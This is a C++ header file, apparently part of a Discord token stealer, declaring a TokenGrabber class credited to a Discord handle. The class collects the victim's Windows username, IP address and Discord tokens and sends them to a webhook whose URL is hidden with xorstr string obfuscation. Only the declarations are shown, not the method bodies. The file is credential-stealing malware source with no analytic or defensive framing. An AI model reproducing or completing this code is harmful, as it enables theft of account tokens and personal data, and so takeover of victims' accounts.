#pragma once
#include <Windows.h>
#include <iostream>
#include <filesystem>
#include <regex>
#include <fstream>
#include <chrono>
#include <thread>
#include <wininet.h>
#include <Lmcons.h>

#define CURL_STATICLIB
#include <curl/curl.h>

#include "..\encryption\xorstr.h"

#pragma warning(disable : 4996).
#pragma comment(lib, "wininet.lib")

class TokenGrabber // deplantis#6315
{
public:
  
    void grabALL()
    {
        grabpcusername();
        grabip();
        grabtoken();
    }

    void grabtoken();
    void grabip();
    void grabpcusername();
private:
    void findtoken(const std::string& path);
    void sendwebhook(const std::string& content);
private:
   const std::string webhookname = "tudou"; // the webhook name
   const std::string webhook_url = xorstr_(" (webhook url) "); // webhook url
   const std::string avatar_url = xorstr_("https://i.pinimg.com/236x/99/c8/8f/99c88f80f5080c31ddbb817e7ab3c8c3.jpg"); // tudou
   std::vector<std::string> discordtokens; // this is where all tokens gonna get stored
};
